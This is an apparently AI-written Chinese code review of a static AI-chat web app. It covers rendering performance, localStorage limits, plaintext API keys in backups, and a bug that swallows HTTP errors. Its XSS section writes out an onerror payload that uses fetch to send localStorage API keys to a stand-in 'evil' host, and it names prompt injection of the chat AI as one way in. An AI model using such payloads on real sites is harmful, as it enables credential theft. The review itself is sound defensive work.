## 一、内存与性能

### ✅ 先说没问题的（避免误伤）

- **`chat/chat/chat.html` 的 `renderChatList()`（1172 行）没有泄漏**。`container.innerHTML = groupsHTML + rolesHTML` 整块重建，旧节点连同其上用 `addEventListener` 绑的监听器一起被释放；`pageshow` 重复调用也只是重建，不累积。角色名/最后一条消息都走了 `escapeHtml`。**你担心的这一点可以放心。**
- **`phone_stream.js` 的三段式定时器回收完整**（`clearAllTimers()` 在成功/HTTP 错/异常三条路径上都被调用），rAF 节流用 `paintScheduled` 去重，无泄漏。
- **`companion/live.html` 的 DOM 增长有硬上限**：弹幕 `while(stream.children.length>18)`（505 行）、爱心 2.7s 自动 `remove()`（540 行）、气泡 2.5s 移除（570 行）。这块写得比我预期好。
- **`index.html` 日历组件** `render()` 每次先 `gridEl.innerHTML = ''`，60s 轮询不会累积节点。

### 🔴 P1 · `renderAllMessages()` 每回合全量重建（`chat/chat/chat-detail.html:3209`）

```js
function renderAllMessages() {
    chatMessages.innerHTML = `<div class="message-time">Just now</div>`;
    ...
    visibleList.forEach(function (m, i) { appendMessageToDOM(m, i); });
```

每收到一条 AI 回复就清空 + 重建**全部**气泡。代价：
- O(n) DOM 重建，n = 历史消息条数；
- 每条图片消息的 `<img src="data:image/jpeg;base64,...">` 被重新创建并**重新解码一遍 base64**；
- 渲染函数里还夹带了 `saveMessages()` 写盘（3216、3223 行）——渲染带副作用，且每次重渲染都可能触发一次 localStorage 序列化。

**建议**：改成追加式渲染。新消息只 `appendMessageToDOM` 一条；仅在「删除消息 / 切换角色 / 搜索跳转 hl / 首次加载」四条路径才全量重建。

### 🔴 P1 · `chat_history_<id>` 无上限，图片以 dataURL 内嵌（CLAUDE.md M2 已承认未修）

- 常驻内存：`historyList` 数组持有全部消息，含 base64 图片字符串。
- 存储侧：localStorage 5MB 硬顶，写满会抛 `QuotaExceededError`。
- 一张 200KB 的图 → base64 约 267KB 字符串，20 张就吃掉一半配额。

**建议**（按性价比排序）：
1. 图片/贴纸改存 **IndexedDB Blob**，消息体只存 `imgId` 引用，渲染时 `URL.createObjectURL()`（记得 `revokeObjectURL`）；
2. 历史分页：保留最近 200 条在主 key，更早的归档到 `chat_history_<id>_archive_N`，上下文注入只取最近 10-50 条（现有逻辑已如此，不受影响）。

### 🟡 P2 · 语音播放 interval 未被重渲染打断（`chat-detail.html:5356`）

`vtimer` 在自身内部 `clearInterval`，正常情况下 1.7s 结束。但若播放期间触发 `renderAllMessages()`，`vbars` 指向的节点已脱离文档，interval 仍持有引用跑到结束。

**建议**：把 timer id 提到模块级变量，在 `renderAllMessages()` 开头统一 `clearInterval`。

### 🟡 P2 · 若干页面 setInterval 无 clearInterval

`worldbook/memory/memory.html:1603`、`diary/diary.html:915`、`companion/live.html:608`、`chat/shake/shake.html:405`、`travel/dream-travel.html`、`inspect-phone/phone.html`。

**定性**：MPA 架构下整页跳转会销毁 JS 上下文，**不会跨页累积**，所以这不是泄漏，是"不会停"。但 diary/travel 这类若页内重渲染重复注册，会叠加。

**建议**：统一加 `window.addEventListener('pagehide', ...)` 清理，成本极低。

## 三、安全

### 🔴 P0 · 备份导出会打包明文 API Key（`settings/js/backup.js:21`）

```js
var EXCLUDE_KEYS = ['api_call_logs'];
```

只排除了调用日志。这意味着 **`api_settings`、`api_profiles_v1`（以及 minimax TTS 的 key）会被完整写进备份 JSON**。用户把备份文件发给朋友"帮我看看我的角色设定"，就等于把 Key 交出去了。

**建议**：
```js
var EXCLUDE_KEYS = ['api_call_logs', 'api_settings', 'api_profiles_v1', 'minimax_tts_settings'];
```
并提供「含密钥 / 不含密钥」两个导出选项（默认不含），导入后提示需重新配置 API。

### 🔴 P0 · 存储型 XSS，且能串成完整的 Key 窃取链

`chat-detail.html` 已有 `escHtml()`（5609 行），但**只用了 21 处，覆盖不全**。以下位置把动态值直接拼进 `innerHTML`：

| 位置 | 代码 | 数据来源 |
|---|---|---|
| `:2869` | `'<span class="heart-content">' + heartText + '</span>'` | **AI 输出**（`[心声:...]`） |
| `:2887` | `'<div class="voice-transcript">' + String(msg.text) + '</div>'` | 消息文本 |
| `:3089` | `'<div class="card-name">' + String(cd.name \|\| '') + '</div>'` | 名片数据 |
| `:2847` | `'<img class="msg-media-img" src="' + String(msg.img) + '" alt="">'` | 图片 dataURL |
| `:2926` | `` `${loc.label}` `` | 位置卡 |
| `:2935` | `` `${a.name}` `` / `` `${a.date}` `` | 纪念日卡 |
| `:2945` | `` `${i.text}` `` | 待办卡 |
| `:2957` | `` `${m.title}` `` / `` `${m.content}` `` | 时刻卡 |
| `:3084` | `'<img src="' + String(cd.avatar) + '" alt="">'` | 名片头像 |

**可利用路径**：
```
AI 被提示词注入 / 用户导入恶意备份
  → 输出含 <img src=x onerror="fetch('//evil/?k='+localStorage.api_settings)"> 的文本
  → 存进 chat_history_<id>
  → renderAllMessages() 用 innerHTML 渲染
  → 脚本执行，API Key 外泄
```
`src="` 拼接那条同理：值里带 `"` 即可闭合属性，追加 `onerror=`。

**建议**：
1. 所有进入 `innerHTML` 的动态值一律包 `escHtml()`（含模板字面量里的 `${}`）；
2. `src` / `href` 额外做协议白名单校验，只允许 `data:image/`、`https:`、`blob:`；
3. 渲染图片优先用 `document.createElement('img')` + `img.src =`（`src` 属性赋值不会被闭合绕过）；
4. `chat.html` 的头像 `role.avatar` / `g.avatar` 同样未转义（已转义的是 name 和 lastMsg），一并处理。

### 🟡 P1 · 无 CSP

纯静态站加 CSP 成本极低，能直接掐断上面那条链的外联。GitHub Pages 需用 meta 标签形式：

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; img-src 'self' data: blob: https:;
               connect-src 'self' https:; script-src 'self' 'unsafe-inline';
               style-src 'self' 'unsafe-inline'">
```
（`script-src` 的 `'unsafe-inline'` 是因为项目大量内嵌 `<script>`，先止血 XSS 外联，后续再考虑 nonce 化。）

### 🟡 P1 · API Key 明文存 localStorage

同源脚本、XSS、恶意浏览器扩展都可读。对纯本地应用**可接受**，但建议：
- 不要把 Key 混进 `phone_data_v2`；
- 导入/导出时给显式风险提示；
- 不要用 WebCrypto 做"加密"当真防护 —— 同源即可解，只防肩窥和误分享，**防不住 XSS**。优先级低于修 XSS。

### 🐛 P1 · 真实 Bug：PhoneStream 的 HTTP 错误被静默吞掉（`shared/js/phone/phone_stream.js`）

```js
// 143-152 行：HTTP 错误分支
if (!response.ok || !response.body) {
    clearAllTimers();
    return response.text()...then(function (bodyText) {
        finish({ kind: 'http', status: response.status, detail: ... });  // ① 设置 error
    });
}
...
// 223 行：链尾无条件执行
}).then(function () {
    finish(null);   // ② 把同一个 result 对象改回 ok:true, error:null
})
```

`result` 是闭包里的同一个对象，`resolve` 后仍被 ② 修改。结果：**401 / 429 / 404 时调用方拿到的 `streamResult.ok === true` 且 `error === null`**，`chat-detail.html:4689` 的 `if (!streamResult.ok)` 分支永远不进，用户看不到「API Key 无效」「额度不足」等提示，只会得到一个空回复。

**修法**（链尾加已收尾判断）：
```js
var settled = false;
function finish(err) {
    if (settled) return;      // 只认第一次收尾
    settled = true;
    result.ok = !err;
    result.fullText = fullText;
    result.error = err || null;
    resolve(result);
}
```

### ✅ 已确认无问题的

- **源码里没有硬编码密钥**：全仓 grep `sk-` 无任何命中，Key 全部来自用户在设置页填写。
- Key 输入框 `type="password"` 且可切换明文（`settings/settings.html:246`、`settings.js:178`）。
- `logApiCall()`（chat-detail:3717）只记录 model / status / duration / errorMsg 前 200 字符，**不记录密钥**，且日志上限 50 条。
